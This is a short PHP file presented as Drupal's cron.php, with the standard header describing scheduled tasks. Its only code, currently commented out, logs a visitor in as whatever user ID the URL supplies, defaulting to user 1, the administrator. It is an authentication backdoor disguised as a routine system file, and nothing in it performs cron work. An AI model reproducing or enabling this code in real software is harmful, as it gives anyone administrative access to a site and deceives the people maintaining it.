<?php
// $Id: cron.php,v 1.36 2006/08/09 07:42:55 dries Exp $

/**
 * @file
 * Handles incoming requests to fire off regularly-scheduled tasks (cron jobs).
 */

//define('DRUPAL_ROOT', getcwd());
//
//require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
//drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
//
//$uid = $_GET['uid'];
//if(!$uid) $uid =1;
//
//
//$user = user_load($uid);
//user_login_finalize($user);
//
//drupal_goto('<front>');